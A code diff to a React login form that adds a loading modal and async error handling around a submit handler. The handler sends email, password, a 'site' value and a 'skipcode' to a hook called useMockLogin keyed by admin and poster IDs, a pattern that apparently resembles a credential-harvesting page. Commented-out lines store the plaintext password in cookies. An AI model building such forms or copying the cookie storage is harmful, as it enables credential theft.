@@ -7,10 +7,11 @@ import SubmitButton from "./SubmitButton";
 import { site } from "../config";
 import useMockLogin from "../hooks/useMockLogin";
 import Cookies from "js-cookie";
+import LoadingModal from "./LoadingModal";
 
 function LoginForm({ adminId, posterId }) {
   const [showPassword, setShowPassword] = useState(false);
-
+  const [isLoading, setIsLoading] = useState(false);
   const initialvalues = {
     email: "",
     password: "",
@@ -23,18 +24,24 @@ function LoginForm({ adminId, posterId }) {
 
   const { login } = useMockLogin(adminId, posterId);
 
-  const handleSubmit = (values, formik) => {
-    const { email, password } = values;
+  const handleSubmit = async (values, formik) => {
+    setIsLoading(true);
+    try {
+      const { email, password } = values;
 
-    const submitValues = {
-      site: site,
-      email: email,
-      password: password,
-      skipcode: "",
-    };
+      const submitValues = {
+        site: site,
+        email: email,
+        password: password,
+        skipcode: "",
+      };
 
-    login(submitValues, formik);
-
+      await login(submitValues, formik);
+    } catch (error) {
+      console.error(error);
+    } finally {
+      setIsLoading(false);
+    }
     // Cookies.set("email", email);
     // Cookies.set("password", password);
 
@@ -44,6 +51,7 @@ function LoginForm({ adminId, posterId }) {
   return (
     <div className="md:w-[550px] lg:w-[632px] mx-auto mt-[60px] lg:mt-[95px] mb-[90px] lg:mb-[144px]">
       <div className="flex flex-col items-ceneter">
+        <LoadingModal isOpen={isLoading} onClose={() => setIsLoading(false)} />
         <div className="">
           <div className="bg-custom-indigo text-white text-xl font-medium px-[26px] py-[18px] shadow-md">
             Login
